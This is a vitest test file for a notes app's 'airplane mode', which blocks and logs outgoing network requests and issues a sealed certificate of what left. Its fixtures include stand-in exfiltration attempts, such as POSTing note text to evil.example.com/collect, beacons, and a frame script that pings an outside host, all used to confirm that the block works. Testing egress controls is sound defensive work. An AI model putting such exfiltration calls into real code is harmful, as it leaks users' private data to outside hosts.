/**
 * Plan W5.9 — provable airplane mode (src/privacy/airplane.ts, airplaneBoot.ts,
 * airplaneCertificate.ts, and the worker half in src/ai/workerLedger.ts).
 *
 * The wrappers are installed on a fake window, so every request is seen and
 * nothing reaches a network: while the switch is on, a request to another
 * host is refused before the inner fetch / socket runs, and the attempt is
 * in the live list (synchronously: well inside the 1 s of the acceptance)
 * with the place in the code it came from.
 */
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { describe, it, expect, beforeEach } from "vitest";
import {
  __resetAirplane,
  AirplaneBlockedError,
  airplaneModeOn,
  codeOrigin,
  disableAirplaneMode,
  egressAttempts,
  egressTarget,
  enableAirplaneMode,
  EMBED_ORIGINS,
  guardedSandbox,
  installAirplaneMode,
  stopFrames,
  trackOpen,
  subscribeEgress,
  verdict,
} from "../privacy/airplane";
import { AIRPLANE_CSP, AIRPLANE_KEY, AIRPLANE_TAB, airplaneFlagOn, airplaneWorkerName, answerWorkers, followOtherTab, __setAirplaneFlag } from "../privacy/airplaneBoot";
import { buildCertificate, reachedNetwork, sealCertificate, verifyCertificate } from "../privacy/airplaneCertificate";
import { AIRPLANE_WAIT_MS, installWorkerLedger, type AirplaneMessage } from "../ai/workerLedger";

const BASE = "https://lumen-md.vercel.app/notes/x";

interface Fake {
  win: Window & typeof globalThis;
  calls: { url: string; init?: RequestInit }[];
  sockets: { url: string; closed: boolean }[];
  xhrSent: string[];
  beacons: string[];
  peers: number;
}

function fakeWindow(): Fake {
  const calls: Fake["calls"] = [];
  const sockets: Fake["sockets"] = [];
  const xhrSent: string[] = [];
  const beacons: string[] = [];
  const f = { peers: 0 } as Fake;
  class FakeSocket {
    rec: { url: string; closed: boolean };
    constructor(url: string) {
      this.rec = { url, closed: false };
      sockets.push(this.rec);
    }
    close() {
      this.rec.closed = true;
    }
    addEventListener() {}
  }
  class FakeXhr {
    url = "";
    open(_m: string, url: string) {
      this.url = url;
    }
    send() {
      xhrSent.push(this.url);
    }
  }
  class FakePeer {
    constructor() {
      f.peers++;
    }
    close() {}
  }
  const win = {
    location: { href: BASE },
    fetch: async (input: RequestInfo | URL, init?: RequestInit) => {
      calls.push({ url: String(input), init });
      return new Response("ok");
    },
    XMLHttpRequest: FakeXhr,
    WebSocket: FakeSocket,
    EventSource: FakeSocket,
    RTCPeerConnection: FakePeer,
    navigator: { sendBeacon: (url: string) => (beacons.push(url), true) },
    document: { addEventListener() {} },
  } as unknown as Window & typeof globalThis;
  return Object.assign(f, { win, calls, sockets, xhrSent, beacons });
}

let fake: Fake;
beforeEach(() => {
  __resetAirplane();
  localStorage.clear();
  document.getElementById("lumen-airplane-csp")?.remove();
  fake = fakeWindow();
  installAirplaneMode(fake.win);
});

const last = () => egressAttempts()[egressAttempts().length - 1];

describe("airplane mode off: everything passes, every attempt is listed", () => {
  it("lists a request with its destination (no query) and where it came from", async () => {
    await fake.win.fetch("https://api.example.com/v1/chat?key=SECRET#x", { method: "POST", body: "hi" });
    expect(fake.calls).toHaveLength(1);
    expect(last()).toMatchObject({ kind: "fetch", target: "https://api.example.com/v1/chat", method: "POST", decision: "allowed" });
    expect(last().target).not.toContain("SECRET");
    // The test's own frame, not the wrapper's (two frames up).
    expect(last().origin).not.toMatch(/^(note|blockedAttempt|airplaneFetch)\b/);
    expect(last().origin).toMatch(/:\d+:\d+$/);
  });
});

describe("airplane mode on", () => {
  beforeEach(() => enableAirplaneMode());

  it("is kept, and the page gets the browser-enforced CSP <meta>", () => {
    expect(airplaneModeOn()).toBe(true);
    expect(typeof JSON.parse(localStorage.getItem(AIRPLANE_KEY)!).since).toBe("number");
    const meta = document.getElementById("lumen-airplane-csp") as HTMLMetaElement;
    expect(meta.httpEquiv).toBe("Content-Security-Policy");
    expect(meta.content).toBe(AIRPLANE_CSP);
    // Nothing but the page itself and loopback: no https: source, no wildcard host.
    const sources = AIRPLANE_CSP.split(/[\s;]+/);
    expect(sources.filter((t) => t === "https:" || t === "*" || t.startsWith("https://") || t.startsWith("wss://"))).toEqual([]);
  });

  it("refuses another host before the request runs, and lists it within the same tick", async () => {
    const t0 = Date.now();
    let seenAt = 0;
    const off = subscribeEgress(() => (seenAt ||= Date.now()));
    let err: unknown = null;
    try {
      await fake.win.fetch("https://evil.example.com/collect", { method: "POST", body: "note text" });
    } catch (e) {
      err = e;
    }
    off();
    expect(err).toBeInstanceOf(AirplaneBlockedError);
    expect(fake.calls).toHaveLength(0);
    expect(last()).toMatchObject({ kind: "fetch", target: "https://evil.example.com/collect", decision: "blocked" });
    expect(last().origin).not.toMatch(/^(note|blockedAttempt|airplaneFetch)\b/);
    expect(seenAt - t0).toBeLessThan(1000);
  });

  it("the app's own files: GET from a cache only; anything else to its server is refused", async () => {
    await fake.win.fetch("/dict/he.txt");
    expect(fake.calls[0].init).toMatchObject({ cache: "only-if-cached", mode: "same-origin" });
    expect(last().decision).toBe("cache-only");
    await expect(fake.win.fetch("/api/feedback", { method: "POST" })).rejects.toBeInstanceOf(AirplaneBlockedError);
    expect(fake.calls).toHaveLength(1);
  });

  it("loopback (a local model), blob: and data: stay allowed", async () => {
    await fake.win.fetch("http://127.0.0.1:11434/api/tags");
    await fake.win.fetch("http://localhost:11434/api/chat", { method: "POST" });
    await fake.win.fetch("blob:https://lumen-md.vercel.app/1234");
    expect(fake.calls.map((c) => c.init?.cache)).toEqual([undefined, undefined, undefined]);
    expect(egressAttempts().map((a) => a.decision)).toEqual(["local", "local", "local"]);
  });

  it("XMLHttpRequest, WebSocket, EventSource, sendBeacon and WebRTC are refused too", () => {
    const xhr = new fake.win.XMLHttpRequest();
    xhr.open("GET", "https://evil.example.com/x");
    expect(() => xhr.send()).toThrow(AirplaneBlockedError);
    expect(() => new fake.win.WebSocket("wss://signaling.example.com")).toThrow(AirplaneBlockedError);
    expect(() => new fake.win.EventSource("https://evil.example.com/sse")).toThrow(AirplaneBlockedError);
    expect(fake.win.navigator.sendBeacon("https://evil.example.com/b", "x")).toBe(false);
    expect(() => new (fake.win as unknown as { RTCPeerConnection: new () => object }).RTCPeerConnection()).toThrow(AirplaneBlockedError);
    expect(fake.xhrSent).toEqual([]);
    expect(fake.sockets).toEqual([]);
    expect(fake.beacons).toEqual([]);
    expect(fake.peers).toBe(0);
    expect(egressAttempts().map((a) => `${a.kind}:${a.decision}`)).toEqual(["xhr:blocked", "websocket:blocked", "eventsource:blocked", "beacon:blocked", "webrtc:blocked"]);
  });

  it("remote images stay behind their placeholder, whatever was allowed", async () => {
    const { allowRemoteImageHosts, remoteImageAllowed, __resetRemoteImagesForTests } = await import("../lib/remoteImages");
    __resetRemoteImagesForTests();
    allowRemoteImageHosts(["img.example.com"]);
    expect(remoteImageAllowed("https://img.example.com/a.png")).toBe(false);
    expect(remoteImageAllowed("./local.png")).toBe(true);
  });

  it("turning it off forgets the switch and reloads (a CSP cannot be lifted)", () => {
    let reloaded = false;
    disableAirplaneMode(() => (reloaded = true));
    expect(reloaded).toBe(true);
    expect(localStorage.getItem(AIRPLANE_KEY)).toBeNull();
  });
});

describe("sockets open before the switch", () => {
  it("are closed when it goes on", () => {
    new fake.win.WebSocket("wss://collab.example.com/room");
    expect(fake.sockets).toEqual([{ url: "wss://collab.example.com/room", closed: false }]);
    enableAirplaneMode();
    expect(fake.sockets[0].closed).toBe(true);
  });
});

describe("verdict, target and code origin", () => {
  it("classifies URLs", () => {
    expect(verdict("https://x.example.com/", BASE)).toBe("network");
    enableAirplaneMode();
    expect(verdict("https://x.example.com/", BASE)).toBe("blocked");
    expect(verdict("/assets/a.js", BASE)).toBe("self");
    expect(verdict("http://[::1]:8080/", BASE)).toBe("local");
    expect(verdict("data:text/plain,hi", BASE)).toBe("local");
    expect(verdict("http://192.168.1.5:11434/", BASE)).toBe("blocked");
    expect(egressTarget("https://a.example.com/p?q=1#f", BASE)).toBe("https://a.example.com/p");
  });

  it("reads the caller's frame, in each engine's stack format", () => {
    const chrome = "Error\n    at blockedAttempt (https://lumen-md.vercel.app/assets/airplane-AbC.js:1:200)\n    at window.fetch (https://lumen-md.vercel.app/assets/airplane-AbC.js:1:900)\n    at async callModel (https://lumen-md.vercel.app/assets/llm-XyZ.js:3:4567)";
    expect(codeOrigin(chrome)).toBe("callModel llm-XyZ.js:3:4567");
    // Merged into one chunk with its caller: the two own frames are skipped by count.
    const merged = "Error\n    at blockedAttempt (https://h/assets/index-1.js:1:200)\n    at window.fetch (https://h/assets/index-1.js:1:900)\n    at callModel (https://h/assets/index-1.js:9:12)";
    expect(codeOrigin(merged, 2)).toBe("callModel index-1.js:9:12");
    const firefox = "blockedAttempt@https://lumen-md.vercel.app/assets/airplane-AbC.js:1:200\ncallModel@https://lumen-md.vercel.app/assets/llm-XyZ.js:3:4567\n";
    expect(codeOrigin(firefox)).toBe("callModel llm-XyZ.js:3:4567");
    const dev = "Error\n    at note (http://localhost:5173/src/privacy/airplane.ts:150:20)\n    at http://localhost:5173/src/ai/grammar.ts?t=1:42:7";
    expect(codeOrigin(dev)).toBe("grammar.ts?t=1:42:7");
  });
});

describe("worker requests (src/ai/workerLedger.ts)", () => {
  function airChannel(on: boolean | null) {
    const posted: AirplaneMessage[] = [];
    let listener: ((e: MessageEvent<AirplaneMessage>) => void) | null = null;
    return {
      posted,
      ch: {
        postMessage(m: AirplaneMessage) {
          posted.push(m);
          if (m.kind === "hello" && on !== null) queueMicrotask(() => listener?.({ data: { kind: "state", on } } as MessageEvent<AirplaneMessage>));
        },
        addEventListener(_t: string, fn: EventListenerOrEventListenerObject) {
          listener = fn as unknown as (e: MessageEvent<AirplaneMessage>) => void;
        },
      } as unknown as BroadcastChannel,
    };
  }

  it("on: a worker's request to another host fails in the worker and is reported", async () => {
    const inner: string[] = [];
    const scope = { fetch: (async (u: string) => (inner.push(u), new Response(""))) as unknown as typeof fetch, name: "transformers", location: { href: "https://lumen-md.vercel.app/assets/w.js" } };
    const ledger = { postMessage() {} } as unknown as BroadcastChannel;
    const air = airChannel(true);
    installWorkerLedger(scope, ledger, air.ch);
    await expect(scope.fetch("https://huggingface.co/model.onnx")).rejects.toThrow(/airplane mode/);
    await scope.fetch("http://127.0.0.1:8080/local");
    expect(inner).toEqual(["http://127.0.0.1:8080/local"]);
    expect(air.posted.filter((m) => m.kind === "attempt")).toEqual([
      { kind: "attempt", url: "https://huggingface.co/model.onnx", method: "GET", worker: "transformers", blocked: true },
      { kind: "attempt", url: "http://127.0.0.1:8080/local", method: "GET", worker: "transformers", blocked: false },
    ]);
  });

  it("off: the request goes ahead", async () => {
    const inner: string[] = [];
    const scope = { fetch: (async (u: string) => (inner.push(u), new Response(""))) as unknown as typeof fetch, name: "w" };
    installWorkerLedger(scope, { postMessage() {} } as unknown as BroadcastChannel, airChannel(false).ch);
    await scope.fetch("https://huggingface.co/model.onnx");
    expect(inner).toEqual(["https://huggingface.co/model.onnx"]);
  });
});

describe("certificate", () => {
  it("states the window, counts 0 that left, and any change breaks it", async () => {
    enableAirplaneMode();
    const from = Date.now();
    await fake.win.fetch("https://evil.example.com/a").catch(() => {});
    await fake.win.fetch("/assets/app.js");
    await fake.win.fetch("http://127.0.0.1:11434/api/tags");
    const cert = buildCertificate(egressAttempts(), from, Date.now() + 1, "test");
    expect(cert.summary).toEqual({ attempts: 3, blocked: 1, local: 1, cacheOnly: 1, inFlight: 0, left: 0 });
    const sealed = await sealCertificate(cert);
    expect(sealed.sha256).toMatch(/^[0-9a-f]{64}$/);
    expect((await verifyCertificate(sealed)).ok).toBe(true);
    // Changing one attempt (or the summary) is caught.
    const forged = { ...sealed, text: sealed.text.replace('"blocked":1', '"blocked":0') };
    expect((await verifyCertificate(forged)).ok).toBe(false);
    const signed = await sealCertificate(cert, async (text) => `sig:${text.length}`);
    expect(signed.signature).toBe(`sig:${sealed.text.length}`);
  });

  it("a resource that transferred bytes counts as having reached the network", () => {
    const base = { id: 1, ts: 1, method: "script", origin: "script", target: "https://lumen-md.vercel.app/assets/x.js" };
    expect(reachedNetwork({ ...base, kind: "resource", decision: "allowed", transferSize: 0 })).toBe(false);
    expect(reachedNetwork({ ...base, kind: "resource", decision: "allowed", transferSize: 512 })).toBe(true);
    expect(reachedNetwork({ ...base, kind: "csp", decision: "blocked" })).toBe(false);
  });
});

/** The next millisecond (so an attempt made before it is outside a window that starts there). */
function nextMs(): number {
  const t = Date.now();
  let n = t;
  while (n === t) n = Date.now();
  return n;
}

describe("review 12.11 fixes", () => {
  it("runner frames: the airplane CSP loads frames from blob: only, never a URL-loaded page", () => {
    const frameSrc = /frame-src ([^;]+)/.exec(AIRPLANE_CSP)?.[1].trim();
    expect(frameSrc).toBe("blob:");
  });

  it("a worker that hears no answer blocks (fail closed), and a later 'off' lets the next request go", async () => {
    const inner: string[] = [];
    const scope = { fetch: (async (u: string) => (inner.push(u), new Response(""))) as unknown as typeof fetch, name: "w", location: { href: "https://lumen-md.vercel.app/assets/w.js" } };
    let listener: ((e: MessageEvent<AirplaneMessage>) => void) | null = null;
    const air = {
      postMessage() {},
      addEventListener(_t: string, fn: EventListenerOrEventListenerObject) {
        listener = fn as unknown as (e: MessageEvent<AirplaneMessage>) => void;
      },
    } as unknown as BroadcastChannel;
    installWorkerLedger(scope, { postMessage() {} } as unknown as BroadcastChannel, air);
    const t0 = Date.now();
    await expect(scope.fetch("https://huggingface.co/model.onnx")).rejects.toThrow(/not confirmed off/);
    expect(Date.now() - t0).toBeGreaterThanOrEqual(AIRPLANE_WAIT_MS - 50);
    expect(inner).toEqual([]);
    listener!({ data: { kind: "state", on: false } } as MessageEvent<AirplaneMessage>);
    await scope.fetch("https://huggingface.co/model.onnx");
    expect(inner).toEqual(["https://huggingface.co/model.onnx"]);
  }, 10_000);

  it("the startup half answers a worker's hello with the switch's state", () => {
    const posted: unknown[] = [];
    let fn: ((e: MessageEvent) => void) | null = null;
    const ch = { postMessage: (m: unknown) => posted.push(m), addEventListener: (_t: string, f: EventListener) => (fn = f as unknown as (e: MessageEvent) => void) };
    __setAirplaneFlag(true);
    answerWorkers(() => ch as unknown as BroadcastChannel);
    fn!({ data: { kind: "hello" } } as MessageEvent);
    __setAirplaneFlag(false);
    fn!({ data: { kind: "hello" } } as MessageEvent);
    fn!({ data: { kind: "attempt" } } as MessageEvent);
    expect(posted).toEqual([{ kind: "state", on: true }, { kind: "state", on: false }]);
  });

  it("a request still waiting for its answer when the switch goes on is counted as having left, and aborted", async () => {
    let seen: AbortSignal | undefined;
    fake.win.fetch = ((_: RequestInfo | URL, init?: RequestInit) => {
      seen = init?.signal ?? undefined;
      return new Promise<Response>((_res, rej) => seen?.addEventListener("abort", () => rej(seen?.reason)));
    }) as typeof fetch;
    __resetAirplane();
    installAirplaneMode(fake.win);
    const pending = fake.win.fetch("https://upload.example.com/big", { method: "POST" });
    const from = nextMs(); // the window starts after the request did
    enableAirplaneMode();
    await expect(pending).rejects.toBeInstanceOf(AirplaneBlockedError);
    expect(seen?.aborted).toBe(true);
    const cert = buildCertificate(egressAttempts(), from, Date.now() + 1, "test");
    expect(cert.summary.inFlight).toBe(1);
    expect(cert.summary.left).toBe(1);
    expect(cert.attempts.find((a) => a.decision === "in-flight")).toMatchObject({ kind: "fetch", target: "https://upload.example.com/big", method: "POST" });
    expect(cert.counts.length).toBeGreaterThan(0);
    expect(cert.notCounted.length).toBeGreaterThan(0);
  });

  it("an open socket at the switch is closed and counted", () => {
    new fake.win.WebSocket("wss://collab.example.com/room");
    const from = nextMs();
    enableAirplaneMode();
    expect(fake.sockets[0].closed).toBe(true);
    expect(buildCertificate(egressAttempts(), from, Date.now() + 1, "test").summary).toMatchObject({ inFlight: 1, left: 1 });
  });

  it("counts attempts, not bytes: a resource with no reported size (another origin) reached the network", () => {
    const base = { id: 1, ts: 1, method: "img", origin: "img", target: "https://tracker.example.com/p.gif" };
    expect(reachedNetwork({ ...base, kind: "resource", decision: "allowed" })).toBe(true);
    expect(reachedNetwork({ ...base, kind: "fetch", decision: "in-flight" })).toBe(true);
  });
});

describe("review 2 fixes", () => {
  beforeEach(() => __resetAirplane());

  it("a worker named for its window takes answers only from that window, and on sticks until a reload", async () => {
    const inner: string[] = [];
    const scope = { fetch: (async (u: string) => (inner.push(u), new Response(""))) as unknown as typeof fetch, name: airplaneWorkerName("transformers"), location: { href: "https://lumen-md.vercel.app/assets/w.js" } };
    const hellos: AirplaneMessage[] = [];
    let listener: ((e: MessageEvent<AirplaneMessage>) => void) | null = null;
    const air = {
      postMessage: (m: AirplaneMessage) => hellos.push(m),
      addEventListener(_t: string, fn: EventListenerOrEventListenerObject) {
        listener = fn as unknown as (e: MessageEvent<AirplaneMessage>) => void;
      },
    } as unknown as BroadcastChannel;
    installWorkerLedger(scope, { postMessage() {} } as unknown as BroadcastChannel, air);
    expect(hellos[0]).toEqual({ kind: "hello", tab: AIRPLANE_TAB });
    const say = (data: AirplaneMessage) => listener!({ data } as MessageEvent<AirplaneMessage>);
    // Another tab, still off, answers first; then a message with no window at all: neither counts.
    say({ kind: "state", on: false, tab: "another-tab" });
    say({ kind: "state", on: false });
    say({ kind: "state", on: true, tab: AIRPLANE_TAB });
    await expect(scope.fetch("https://huggingface.co/model.onnx")).rejects.toThrow(/airplane mode is on/);
    // Even this window saying off does not lift it: turning off reloads the page.
    say({ kind: "state", on: false, tab: AIRPLANE_TAB });
    await expect(scope.fetch("https://huggingface.co/model.onnx")).rejects.toThrow(/airplane mode is on/);
    expect(inner).toEqual([]);
  });

  it("the startup half answers only its own window's workers (and those that name none)", () => {
    const posted: unknown[] = [];
    let fn: ((e: MessageEvent) => void) | null = null;
    const ch = { postMessage: (m: unknown) => posted.push(m), addEventListener: (_t: string, f: EventListener) => (fn = f as unknown as (e: MessageEvent) => void) };
    __setAirplaneFlag(true);
    answerWorkers(() => ch as unknown as BroadcastChannel);
    fn!({ data: { kind: "hello", tab: "another-tab" } } as MessageEvent);
    fn!({ data: { kind: "hello", tab: AIRPLANE_TAB } } as MessageEvent);
    __setAirplaneFlag(false);
    expect(posted).toEqual([{ kind: "state", on: true, tab: AIRPLANE_TAB }]);
  });

  it("every frame that can make requests is stopped and recorded when the switch goes on (reviews 2 and 4)", () => {
    const frame = (attrs: Record<string, string>, title = "") => {
      const a = new Map(Object.entries(attrs));
      const f = {
        title,
        contentDocument: null,
        getAttribute: (k: string) => a.get(k) ?? null,
        setAttribute: (k: string, v: string) => void a.set(k, v),
        removeAttribute: (k: string) => void a.delete(k),
        attr: (k: string) => a.get(k) ?? null,
      };
      return f;
    };
    const runner = frame({ src: "https://lumen-md.vercel.app/playground-runner.html", sandbox: "allow-scripts" });
    const live = frame({ src: "https://lumen-md.vercel.app/livejs-runner.html#x" });
    const blob = frame({ src: "blob:https://lumen-md.vercel.app/1" });
    const preview = frame({ srcdoc: "<script>setInterval(() => new Image().src = 'https://example.com/x', 200)</script>", sandbox: "allow-scripts" }, "HTML preview");
    const embed = frame({ src: "https://example.com/embed", sandbox: "allow-scripts allow-same-origin allow-popups" });
    const inert = frame({ srcdoc: "<p>no scripts</p>", sandbox: "" });
    const empty = frame({});
    const doc = { querySelectorAll: () => [runner, live, blob, preview, embed, inert, empty] } as unknown as Document;
    expect(stopFrames(doc, 1000)).toBe(6);
    expect([runner, live, blob, preview, embed, inert].map((f) => f.attr("src"))).toEqual(Array(6).fill("about:blank"));
    expect(preview.attr("srcdoc")).toBeNull();
    // Sandboxed without scripts, it still loads what its CSS asks for (review 6): stopped too.
    expect(inert.attr("srcdoc")).toBeNull();
    // An empty frame has nothing to stop.
    expect(empty.attr("src")).toBeNull();
    const frames = egressAttempts().filter((a) => a.kind === "frame" && a.method === "FRAME");
    // Frames that could have opened a window this page can't reach (allow-popups, or no sandbox) are counted
    // as possible windows too (review 8, RR8-451-1, -2): the embed, and the frames with no sandbox.
    const windows = egressAttempts().filter((a) => a.kind === "frame" && a.method === "POPUP");
    expect(windows.map((a) => a.target)).toEqual([
      "https://lumen-md.vercel.app/livejs-runner.html",
      "blob:…",
      "https://example.com/embed",
      "about:blank",
    ]);
    expect(windows.every((a) => reachedNetwork(a))).toBe(true);
    expect(frames.map((a) => a.target)).toEqual([
      "https://lumen-md.vercel.app/playground-runner.html",
      "https://lumen-md.vercel.app/livejs-runner.html",
      "blob:…",
      "about:srcdoc",
      "https://example.com/embed",
      "about:srcdoc",
    ]);
    expect(frames.map((a) => a.origin)).toContain("HTML preview");
    expect(frames.every((a) => a.decision === "in-flight" && reachedNetwork(a))).toBe(true);
  });

  it("no frame gets allow-popups while the switch is on; a frame from another site keeps same-origin powers only as a known embed (review 6, RR6-451-2; review 8, RR8-451-2)", () => {
    const base = "https://lumen-md.vercel.app/note";
    expect(guardedSandbox("allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox", "https://www.youtube-nocookie.com/embed/x", base, true)).toBe("allow-scripts allow-same-origin");
    expect(guardedSandbox("allow-scripts allow-same-origin", "https://example.com/widget", base, true)).toBe("allow-scripts");
    expect(guardedSandbox("allow-scripts allow-same-origin", "/livejs-runner.html", base, true)).toBe("allow-scripts allow-same-origin");
    expect(guardedSandbox("allow-forms ALLOW-POPUPS", null, base, true)).toBe("allow-forms");
    // Off: an embed's links still open their page; another site still loses same-origin powers.
    expect(guardedSandbox("allow-scripts allow-same-origin allow-popups", "https://www.youtube.com/embed/x", base, false)).toBe("allow-scripts allow-same-origin allow-popups");
    expect(guardedSandbox("allow-scripts allow-same-origin allow-popups", "https://example.com/widget", base, false)).toBe("allow-scripts allow-popups");
    // The embed block's providers are the known ones.
    const src = readFileSync(resolve(process.cwd(), "src/plugins/EmbedBlock.tsx"), "utf8");
    const origins = new Set([...src.matchAll(/src: `(https:\/\/[^/`$]+)/g)].map((m) => m[1]));
    expect(origins.size).toBeGreaterThan(10);
    for (const o of origins) expect(EMBED_ORIGINS.has(o), o).toBe(true);
    // One list (RR8-451-2): the known embeds are exactly the https origins public/_headers lets frames load from.
    const headers = readFileSync(resolve(process.cwd(), "public/_headers"), "utf8");
    const frameSrc = /frame-src ([^;]+);/.exec(headers)?.[1] ?? "";
    expect([...EMBED_ORIGINS].sort()).toEqual(frameSrc.split(" ").filter((t) => t.startsWith("https://")).sort());
  });

  it("windows opened through window.open are closed and counted when the switch goes on (RR6-451-2)", () => {
    const closed: string[] = [];
    const win = { open: (url: string) => ({ closed: false, close: () => closed.push(url) }) } as unknown as Window;
    trackOpen(win);
    trackOpen(win); // once
    win.open("https://example.com/popup", "_blank");
    expect(stopFrames({ querySelectorAll: () => [] } as unknown as Document, 1000)).toBe(0);
    expect(closed).toEqual(["https://example.com/popup"]);
    expect(egressAttempts().filter((a) => a.method === "POPUP").map((a) => a.target)).toEqual(["https://example.com/popup"]);
  });

  it("the startup half follows another tab's switch even without this chunk (review 4)", () => {
    const head = { children: [] as unknown[], appendChild: (m: unknown) => head.children.push(m) };
    const live = { title: "", contentDocument: null, a: new Map([["src", "/livejs-runner.html"]]), getAttribute(k: string) { return this.a.get(k) ?? null; }, setAttribute(k: string, v: string) { this.a.set(k, v); }, removeAttribute(k: string) { this.a.delete(k); } };
    const doc = { head, getElementById: () => null, createElement: () => ({}), querySelectorAll: () => [live] } as unknown as Document;
    __setAirplaneFlag(false);
    followOtherTab({ key: "something.else", newValue: "x" }, doc, []);
    followOtherTab({ key: AIRPLANE_KEY, newValue: null }, doc, []);
    expect(airplaneFlagOn()).toBe(false);
    followOtherTab({ key: AIRPLANE_KEY, newValue: JSON.stringify({ since: 1 }) }, doc, []);
    expect(airplaneFlagOn()).toBe(true);
    expect(head.children).toHaveLength(1);
    expect(live.a.get("src")).toBe("about:blank");
    __setAirplaneFlag(false);
  });
});
